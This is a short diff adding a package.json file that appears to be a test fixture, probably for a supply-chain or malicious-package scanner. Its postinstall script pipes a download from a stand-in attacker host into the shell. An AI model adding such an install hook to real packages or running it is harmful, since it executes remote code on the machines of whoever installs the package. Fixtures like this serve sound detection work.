@@ -1,0 +1,8 @@
+{
+  "name": "dsh-vigil-fixture-sup-01",
+  "version": "1.0.0",
+  "main": "./src/index.js",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example/x.sh | sh"
+  }
+}
